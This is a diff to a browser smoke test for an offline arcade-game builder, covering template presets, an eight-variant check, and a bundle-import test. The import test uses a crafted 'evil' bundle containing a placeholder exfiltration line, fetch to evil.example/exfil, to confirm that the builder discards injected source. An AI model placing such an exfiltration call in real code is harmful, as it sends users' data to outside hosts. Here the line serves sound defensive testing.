@@ -1,7 +1,7 @@
 /**
  * Creator Foundation — Local Arcade Builder browser smoke.
  *
- * Loads the offline builder, checks: default build passes the CF-4 importer gate (VALID), the three
+ * Loads the offline builder, checks: default build passes the CF-4 importer gate (VALID), the eight
  * closed variants all generate importer-clean source, an economy term in display_name → BLOCKED, an
  * impossible size budget → BLOCKED, generated source carries no forbidden constructs (the importer's
  * own scan is the oracle), export gates on validity, result trust stays untrusted_local_proposal,
@@ -36,21 +36,22 @@ try {
     return m.package_kind === 'arcade_game' && m.entry === 'game.mjs' && m.adapter === 'adapter.mjs' && m.assets.length === 0 && m.capabilities.length === 0;
   }));
 
-  // all five closed variants generate importer-clean source
-  for (const v of ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate']) {
+  // all eight closed variants generate importer-clean source
+  const ALL_VARIANTS = ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate', 'split-pulse', 'rail-runner', 'echo-grid'];
+  for (const v of ALL_VARIANTS) {
     await page.selectOption('#variant', v);
     await page.waitForTimeout(100);
     check(`variant ${v} → importer VALID`, await page.evaluate(() => window.__cf_builder.lastReport.ok === true));
   }
-  check('variants generate different game source', await page.evaluate(async () => {
+  check('variants generate different game source', await page.evaluate(async (variants) => {
     const srcs = new Set();
-    for (const v of ['pulse-ring', 'drift-band', 'tri-light', 'orbit-catch', 'tide-gate']) {
+    for (const v of variants) {
       document.getElementById('variant').value = v;
       window.__cf_builder.refresh();
       srcs.add(window.__cf_builder.lastBuild.files['game.mjs']);
     }
-    return srcs.size === 5;
-  }));
+    return srcs.size === variants.length;
+  }, ALL_VARIANTS));
   check('generated source proposes results only (no authority claims)', await page.evaluate(() => /proposeResult/.test(window.__cf_builder.lastBuild.files['game.mjs']) && /public_safe: true/.test(window.__cf_builder.lastBuild.files['game.mjs'])));
   check('generated adapter imports only ./game.mjs', await page.evaluate(() => {
     const a = window.__cf_builder.lastBuild.files['adapter.mjs'];
@@ -58,11 +59,42 @@ try {
     return imports.length === 1 && /from '\.\/game\.mjs'/.test(imports[0]);
   }));
 
+  // throughput: templates are parameter presets — picking one re-gates through the importer
+  await page.selectOption('#template', 'showpiece');
+  await page.waitForTimeout(100);
+  check('template applies its closed params and stays importer-VALID', await page.evaluate(() => {
+    const p = window.__cf_builder.currentParams();
+    return p.variant === 'orbit-catch' && p.accent === 'magenta' && p.speed === 'fast' && window.__cf_builder.lastReport.ok === true;
+  }));
+  check('bundle export enabled on valid', !(await page.evaluate(() => document.getElementById('exportBundle').disabled)));
+
+  // throughput: bundle import restores PARAMS ONLY — bundled source is ignored and regenerated
+  await page.setInputFiles('#importBundle', {
+    name: 'evil.builder.json',
+    mimeType: 'application/json',
+    buffer: Buffer.from(JSON.stringify({
+      schema_version: 1,
+      bundle_kind: 'arcade_builder_bundle',
+      builder_params: { package_id: 'restored-cab', display_name: 'Restored Cabinet', variant: 'tri-light', accent: 'green', speed: 'slow', frame: 'cabinet-480x480', budget: 32768 },
+      files: { 'game.mjs': 'fetch("https://evil.example/exfil"); // MALICIOUS_MARKER' },
+      manifest: { package_id: 'evil-injected' },
+    })),
+  });
+  await page.waitForFunction(() => window.__cf_builder.currentParams().package_id === 'restored-cab', null, { timeout: 4000 });
+  check('bundle import restores parameters through the closed tables', await page.evaluate(() => {
+    const p = window.__cf_builder.currentParams();
+    return p.variant === 'tri-light' && p.accent === 'green' && p.speed === 'slow' && p.display_name === 'Restored Cabinet' && p.frame === 'cabinet-480x480';
+  }));
+  check('bundled source is IGNORED — generated game.mjs carries none of it', await page.evaluate(() =>
+    !/MALICIOUS_MARKER|evil\.example|evil-injected/.test(window.__cf_builder.lastBuild.files['game.mjs'] + JSON.stringify(window.__cf_builder.lastBuild.manifest))));
+  check('post-import build is importer-VALID (regenerated, re-gated)', await page.evaluate(() => window.__cf_builder.lastReport.ok === true));
+
   // economy term in display name → BLOCKED by the shared manifest validator
   await page.fill('#displayName', 'Big Payout Machine');
   await page.waitForFunction(() => window.__cf_builder.lastReport.ok === false, null, { timeout: 4000 });
   check('economy term in display name → BLOCKED', /BLOCKED/.test(await page.evaluate(() => document.getElementById('verdict').textContent)));
   check('export disabled while blocked', await page.evaluate(() => document.getElementById('exportAll').disabled === true));
+  check('issues panel carries a friendly hint for the block (throughput explainer)', await page.evaluate(() => /→ /.test(document.getElementById('issues').textContent)));
   await page.fill('#displayName', 'My First Cabinet');
   await page.waitForFunction(() => window.__cf_builder.lastReport.ok === true, null, { timeout: 4000 });
 
